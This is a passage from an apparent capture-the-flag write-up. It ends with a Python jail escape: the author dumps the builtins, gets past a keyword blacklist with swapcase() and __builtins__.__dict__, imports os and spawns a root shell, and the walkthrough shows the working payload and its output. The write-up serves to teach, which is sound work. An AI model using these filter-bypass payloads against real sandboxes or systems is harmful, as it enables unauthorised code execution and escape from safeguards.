 'ord': &amp;lt;built-in function ord&amp;gt;,
 'pow': &amp;lt;built-in function pow&amp;gt;,
 'print': &amp;lt;built-in function print&amp;gt;,
 'repr': &amp;lt;built-in function repr&amp;gt;,
 'round': &amp;lt;built-in function round&amp;gt;,
 'setattr': &amp;lt;built-in function setattr&amp;gt;,
 'sorted': &amp;lt;built-in function sorted&amp;gt;,
 'sum': &amp;lt;built-in function sum&amp;gt;,
 'vars': &amp;lt;built-in function vars&amp;gt;,
 'None': None,
 'Ellipsis': Ellipsis,
 'NotImplemented': NotImplemented,
 'False': False,
 'True': True,
 'bool': &amp;lt;class 'bool'&amp;gt;,
 'memoryview': &amp;lt;class 'memoryview'&amp;gt;,
 'bytearray': &amp;lt;class 'bytearray'&amp;gt;,
 'bytes': &amp;lt;class 'bytes'&amp;gt;,
 'classmethod': &amp;lt;class 'classmethod'&amp;gt;,
 'complex': &amp;lt;class 'complex'&amp;gt;,
 'dict': &amp;lt;class 'dict'&amp;gt;,
 'enumerate': &amp;lt;class 'enumerate'&amp;gt;,
 'filter': &amp;lt;class 'filter'&amp;gt;,
 'float': &amp;lt;class 'float'&amp;gt;,
 'frozenset': &amp;lt;class 'frozenset'&amp;gt;,
 'property': &amp;lt;class 'property'&amp;gt;,
 'int': &amp;lt;class 'int'&amp;gt;,
 'list': &amp;lt;class 'list'&amp;gt;,
 'map': &amp;lt;class 'map'&amp;gt;,
 'object': &amp;lt;class 'object'&amp;gt;,
 'range': &amp;lt;class 'range'&amp;gt;,
 'reversed': &amp;lt;class 'reversed'&amp;gt;,
 'set': &amp;lt;class 'set'&amp;gt;,
 'slice': &amp;lt;class 'slice'&amp;gt;,
 'staticmethod': &amp;lt;class 'staticmethod'&amp;gt;,
 'str': &amp;lt;class 'str'&amp;gt;,
 'super': &amp;lt;class 'super'&amp;gt;,
 'tuple': &amp;lt;class 'tuple'&amp;gt;,
 'type': &amp;lt;class 'type'&amp;gt;,
 'zip': &amp;lt;class 'zip'&amp;gt;,
 '__debug__': True,
 'BaseException': &amp;lt;class 'BaseException'&amp;gt;,
 'Exception': &amp;lt;class 'Exception'&amp;gt;,
 'TypeError': &amp;lt;class 'TypeError'&amp;gt;,
 'StopAsyncIteration': &amp;lt;class 'StopAsyncIteration'&amp;gt;,
 'StopIteration': &amp;lt;class 'StopIteration'&amp;gt;,
 'GeneratorExit': &amp;lt;class 'GeneratorExit'&amp;gt;,
 'SystemExit': &amp;lt;class 'SystemExit'&amp;gt;,
 'KeyboardInterrupt': &amp;lt;class 'KeyboardInterrupt'&amp;gt;,
 'ImportError': &amp;lt;class 'ImportError'&amp;gt;,
 'ModuleNotFoundError': &amp;lt;class 'ModuleNotFoundError'&amp;gt;,
 'OSError': &amp;lt;class 'OSError'&amp;gt;,
 'EnvironmentError': &amp;lt;class 'OSError'&amp;gt;,
 'IOError': &amp;lt;class 'OSError'&amp;gt;,
 'EOFError': &amp;lt;class 'EOFError'&amp;gt;,
 'RuntimeError': &amp;lt;class 'RuntimeError'&amp;gt;,
 'RecursionError': &amp;lt;class 'RecursionError'&amp;gt;,
 'NotImplementedError': &amp;lt;class 'NotImplementedError'&amp;gt;,
 'NameError': &amp;lt;class 'NameError'&amp;gt;,
 'UnboundLocalError': &amp;lt;class 'UnboundLocalError'&amp;gt;,
 'AttributeError': &amp;lt;class 'AttributeError'&amp;gt;,
 'SyntaxError': &amp;lt;class 'SyntaxError'&amp;gt;,
 'IndentationError': &amp;lt;class 'IndentationError'&amp;gt;,
 'TabError': &amp;lt;class 'TabError'&amp;gt;,
 'LookupError': &amp;lt;class 'LookupError'&amp;gt;,
 'IndexError': &amp;lt;class 'IndexError'&amp;gt;,
 'KeyError': &amp;lt;class 'KeyError'&amp;gt;,
 'ValueError': &amp;lt;class 'ValueError'&amp;gt;,
 'UnicodeError': &amp;lt;class 'UnicodeError'&amp;gt;,
 'UnicodeEncodeError': &amp;lt;class 'UnicodeEncodeError'&amp;gt;,
 'UnicodeDecodeError': &amp;lt;class 'UnicodeDecodeError'&amp;gt;,
 'UnicodeTranslateError': &amp;lt;class 'UnicodeTranslateError'&amp;gt;,
 'AssertionError': &amp;lt;class 'AssertionError'&amp;gt;,
 'ArithmeticError': &amp;lt;class 'ArithmeticError'&amp;gt;,
 'FloatingPointError': &amp;lt;class 'FloatingPointError'&amp;gt;,
 'OverflowError': &amp;lt;class 'OverflowError'&amp;gt;,
 'ZeroDivisionError': &amp;lt;class 'ZeroDivisionError'&amp;gt;,
 'SystemError': &amp;lt;class 'SystemError'&amp;gt;,
 'ReferenceError': &amp;lt;class 'ReferenceError'&amp;gt;,
 'MemoryError': &amp;lt;class 'MemoryError'&amp;gt;,
 'BufferError': &amp;lt;class 'BufferError'&amp;gt;,
 'Warning': &amp;lt;class 'Warning'&amp;gt;,
 'UserWarning': &amp;lt;class 'UserWarning'&amp;gt;,
 'DeprecationWarning': &amp;lt;class 'DeprecationWarning'&amp;gt;,
 'PendingDeprecationWarning': &amp;lt;class 'PendingDeprecationWarning'&amp;gt;,
 'SyntaxWarning': &amp;lt;class 'SyntaxWarning'&amp;gt;,
 'RuntimeWarning': &amp;lt;class 'RuntimeWarning'&amp;gt;,
 'FutureWarning': &amp;lt;class 'FutureWarning'&amp;gt;,
 'ImportWarning': &amp;lt;class 'ImportWarning'&amp;gt;,
 'UnicodeWarning': &amp;lt;class 'UnicodeWarning'&amp;gt;,
 'BytesWarning': &amp;lt;class 'BytesWarning'&amp;gt;,
 'ResourceWarning': &amp;lt;class 'ResourceWarning'&amp;gt;,
 'ConnectionError': &amp;lt;class 'ConnectionError'&amp;gt;,
 'BlockingIOError': &amp;lt;class 'BlockingIOError'&amp;gt;,
 'BrokenPipeError': &amp;lt;class 'BrokenPipeError'&amp;gt;,
 'ChildProcessError': &amp;lt;class 'ChildProcessError'&amp;gt;,
 'ConnectionAbortedError': &amp;lt;class 'ConnectionAbortedError'&amp;gt;,
 'ConnectionRefusedError': &amp;lt;class 'ConnectionRefusedError'&amp;gt;,
 'ConnectionResetError': &amp;lt;class 'ConnectionResetError'&amp;gt;,
 'FileExistsError': &amp;lt;class 'FileExistsError'&amp;gt;,
 'FileNotFoundError': &amp;lt;class 'FileNotFoundError'&amp;gt;,
 'IsADirectoryError': &amp;lt;class 'IsADirectoryError'&amp;gt;,
 'NotADirectoryError': &amp;lt;class 'NotADirectoryError'&amp;gt;,
 'InterruptedError': &amp;lt;class 'InterruptedError'&amp;gt;,
 'PermissionError': &amp;lt;class 'PermissionError'&amp;gt;,
 'ProcessLookupError': &amp;lt;class 'ProcessLookupError'&amp;gt;,
 'TimeoutError': &amp;lt;class 'TimeoutError'&amp;gt;,
 'open': &amp;lt;built-in function open&amp;gt;,
 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit,
 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit,
 'copyright': Copyright (c) 2001-2021 Python Software Foundation.
All Rights Reserved.&#125;
</pre>
<p>Going through this list, I found that "__import__" is available. However, the keyword seems to be blacklisted. Furthermore, the "os" keyword also seems to be blacklisted:</p>
<pre>
>> __import__
Illegal Input
>> os
Illegal Input
</pre>
<p>To bypass it, I tried the following without succes:</p>
<pre>
 __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower())
</pre>
<p>It seems that the lower() keyword is also blaclisted. Apparently, there is another function "swapcase()" which achieves the same. Maybe this one is not blacklisted?</p>
<pre>
>> __builtins__.__dict__['__IMPORT__'.swapcase()]('OS'.swapcase())
>> 
</pre>
<p>No error was thrown indicating we have succesfully imported the "os" module!. Let's now get a shell as root:</p>
<pre>
>> __builtins__.__dict__['__IMPORT__'.swapcase()]('OS'.swapcase()).__dict__['SYSTEM'.swapcase()]('/BIN/SH'.swapcase())
# whoami
root
root@Breakme:~# ls -al
total 52
drwx------  3 root root 4096 Mar 21  2024 .
drwxr-xr-x 18 root root 4096 Aug 17  2021 ..
lrwxrwxrwx  1 root root    9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
-rwx------  1 root root 5438 Jul 31  2023 index.php
-rw-r--r--  1 root root 5000 Mar 21  2024 jail.py
-rw-r--r--  1 root root    0 Mar 21  2024 .jail.py.swp
-rw-------  1 root root   33 Aug  3  2023 .lesshst
drwxr-xr-x  3 root root 4096 Aug 17  2021 .local
-rw-------  1 root root 7575 Feb  4  2024 .mysql_history
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-------  1 root root   33 Aug  3  2023 .root.txt
</pre>
<p>How did this escape work? First of all, we looked at the builtins. These are always available functions. If you know Java you can compare it to typing "System.out.print("Hello")". You did not import "System", it is already there because Java imports some core classes from java.lang automatically. Thus, viewing the builtins revealed that "__import__" was available. However, it seems it was also blaclisted meaning we had to come up with a bypass. Apparently, the filter was kinda dumb as it only blacklisted the lowercase strings. To explain how the .lower() and .swapcase() trick works, here’s some simplified Python code:" </p>
<pre>
bad = ["import", "open", "exec"]

code = getUserInput()

for word in bad:
    if word in code:        # <- string search BEFORE execution
        reject()

eval(code)  # <- only runs if passed the check
</pre>
<p>The getUserInput() function retrieves the user input as a string and is therefore not executed until it reaches the eval function. So, if we type __IMPORT__.lower() or __IMPORT__.swapcase(). It looops through "bad" and it performs the following check: "import" in "IMPORT".lower()? → ❌ no match (uppercase vs lowercase). Therefore, we can bypass the blacklist as the .lower() or .swapcase() is executed when evalling our string. Note, here we had to use swapcase() as loweer() was also in the banned keyword list. So, combined in our final payload, we use the abovementioned bypass to import the "os" module. This is done via the builtins and dict method (__dict__  allows to list all attributes which includes functions variables and classes of the module in a dictionairy) allowing us to call upon it using some string magic, thereby bypassing the blacklisted words. Using the same logic, the system function is called upon which can be used to spawn a root shell after blacklist evasion. </p>

<h2>Final thoughts</h2>
<p> In general, it was a fun but very lengthy box. The initial parts to gain access were quite easy but still a good learning experience. In contrast, the privilege escalation part of the box involving the decompiling the readfile binary as well as the python jail escape were a bit harder. After several days of trying, I eventually had to look at a walkthough for a hint. Nevertheless, I learned a lot of new things doing this box and therefore it was a good learning experience.</p>
<a href="/">Go to the Home Page</a>